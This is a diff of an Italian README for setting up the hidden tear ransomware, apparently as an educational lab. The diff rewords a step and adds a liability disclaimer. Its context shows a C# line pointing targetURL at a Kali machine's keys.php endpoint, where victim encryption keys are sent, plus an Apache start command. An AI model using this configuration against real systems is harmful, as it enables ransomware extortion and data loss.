@@ -16,7 +16,7 @@ Per utilizzarlo mi sono servito di
 
 **Nel mio pc, con visual studio**
 
-* A riga 40 del file *Form1.cs* aggiungere l'indirizzo IP della macchina con kali linux e l'indirizzamento al file keys.php spiegato nello step successivo:
+* A riga 40 del file *Form1.cs* aggiungere l'indirizzo IP della macchina con kali linux e l'indirizzamento al file keys.php (file che verrà spiegato nello successivamente nella guida):
 ```
   string targetURL = "http://192.168.17.128/keys.php?info=";                                                                     
 ```
@@ -63,4 +63,6 @@ service apache2 start
 While this may be helpful for some, there are significant risks. hidden tear may be used only for Educational Purposes. Do not use it as a ransomware! You could go to jail on obstruction of justice charges just for running hidden tear, even though you are innocent.
 
 Anche se questo può essere utile per alcuni, ci sono rischi significativi. Può essere utilizzato solo per scopi educativi. Non usarlo come ransomware! Potresti finire in prigione con l'accusa di ostruzione alla giustizia, anche se sei innocente.
+
+Non mi assumo alcuna responsabilità per eventuali danni a persone, hardware o software, diretti o indiretti, che dovessero verificarsi come conseguenza dell’utilizzo dei miei progetti (inclusi, senza limitazioni, i danni all’integrità fisica e i danni per perdita o mancato guadagno, interruzione dell’attività, perdita di informazioni o altre perdite economiche).
 
